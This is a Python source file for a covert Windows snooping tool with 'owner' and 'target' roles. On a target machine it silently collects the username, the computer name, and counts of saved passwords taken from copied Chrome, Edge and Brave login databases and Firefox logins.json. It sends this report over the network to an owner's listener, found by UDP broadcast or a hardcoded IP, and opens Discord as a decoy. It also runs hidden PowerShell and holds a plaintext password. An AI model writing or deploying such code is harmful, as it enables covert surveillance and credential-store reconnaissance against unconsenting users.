import getpass
import subprocess
import os
import webbrowser
import socket
import sqlite3
import json
import shutil
import threading
import sys
import tkinter as tk
from tkinter import scrolledtext

# ---------------- CONFIG ----------------
OWNER_USERNAME = "isaac"
OWNER_PASSWORD = "hyperpigmentation"
CRED_TARGET    = "OwnerCheck"
CRED_USER      = "Owner"
TARGET_URL     = "https://discord.com"
FALLBACK_OWNER_IP = "172.31.48.1"
DATA_PORT      = 5000
DISCOVERY_PORT = 5001
# ----------------------------------------

def silent_password_check() -> bool:
    try:
        ps_script = f'''
Add-Type -AssemblyName System.Runtime.WindowsRuntime
$null = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
try {{
    $c = $vault.Retrieve("{CRED_TARGET}", "{CRED_USER}")
    $c.RetrievePassword()
    Write-Output $c.Password
}} catch {{ Write-Output "NOT_FOUND" }}
'''
        result = subprocess.run(["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_script],
            capture_output=True, text=True, timeout=10, creationflags=0x08000000)
        return result.stdout.strip() == OWNER_PASSWORD
    except Exception:
        return False

def check_browser_passwords():
    found_browsers = []
    chromium_paths = {
        "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"),
        "Edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"),
        "Brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data"),
    }
    for name, path in chromium_paths.items():
        if os.path.exists(path):
            try:
                temp_db = os.path.join(os.getenv("TEMP"), "tmp_login_data")
                shutil.copy2(path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM logins")
                count = cursor.fetchone()[0]
                conn.close()
                os.remove(temp_db)
                if count > 0:
                    found_browsers.append(f"{name} ({count} saved)")
            except Exception:
                pass
    firefox_profile_dir = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
    if os.path.isdir(firefox_profile_dir):
        for profile in os.listdir(firefox_profile_dir):
            logins_file = os.path.join(firefox_profile_dir, profile, "logins.json")
            if os.path.exists(logins_file):
                try:
                    with open(logins_file, "r", encoding="utf-8") as f:
                        data = json.load(f)
                        if data.get("logins"):
                            found_browsers.append(f"Firefox ({len(data['logins'])} saved)")
                            break
                except Exception:
                    pass
    return found_browsers

# --- OWNER ---
def owner_discovery_listener():
    disc_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    disc_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        disc_socket.bind(('0.0.0.0', DISCOVERY_PORT))
    except Exception:
        return
    while True:
        try:
            data, addr = disc_socket.recvfrom(1024)
            if data == b"WHO_IS_OWNER":
                disc_socket.sendto(b"OWNER_HERE", addr)
        except Exception:
            pass

def owner_ui():
    """Tk window that shows the received data."""
    root = tk.Tk()
    root.title("Owner Console")
    root.geometry("500x400")
    
    tk.Label(root, text="Incoming Data:", font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=10, pady=(10, 0))
    
    txt = scrolledtext.ScrolledText(root, wrap="word", font=("Consolas", 9))
    txt.pack(fill="both", expand=True, padx=10, pady=10)
    
    def data_listener():
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind(('0.0.0.0', DATA_PORT))
            server.listen(5)
        except Exception:
            return
        while True:
            try:
                client_socket, addr = server.accept()
                data = client_socket.recv(4096).decode('utf-8')
                # Push into the text box from the background thread
                txt.insert("end", f"\n--- From {addr[0]} ---\n{data}\n")
                txt.see("end")
                client_socket.close()
            except Exception:
                pass

    threading.Thread(target=data_listener, daemon=True).start()
    root.mainloop()

# --- TARGET ---
def find_owner_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.sendto(b"WHO_IS_OWNER", ('<broadcast>', DISCOVERY_PORT))
        data, addr = s.recvfrom(1024)
        if data == b"OWNER_HERE":
            s.close()
            return addr[0]
    except Exception:
        pass
    return FALLBACK_OWNER_IP

def send_to_owner(data):
    owner_ip = find_owner_ip()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((owner_ip, DATA_PORT))
        s.sendall(data.encode('utf-8'))
        s.close()
    except Exception:
        pass

# --- MAIN ---
def main():
    current_user = getpass.getuser()
    is_owner = current_user.lower() == OWNER_USERNAME.lower() or silent_password_check()

    if is_owner:
        # Start discovery, then open UI
        threading.Thread(target=owner_discovery_listener, daemon=True).start()
        owner_ui()
    else:
        data_to_send  = "=== ALERT ===\n"
        data_to_send += f"Target Username: {current_user}\n"
        data_to_send += f"Computer Name: {os.getenv('COMPUTERNAME')}\n"
        browsers = check_browser_passwords()
        data_to_send += f"Saved Passwords Found: {', '.join(browsers) if browsers else 'None'}\n"
        data_to_send += "========================="

        send_to_owner(data_to_send)
        try:
            webbrowser.open(TARGET_URL)
        except Exception:
            pass
        sys.exit(0)

if __name__ == "__main__":
    main()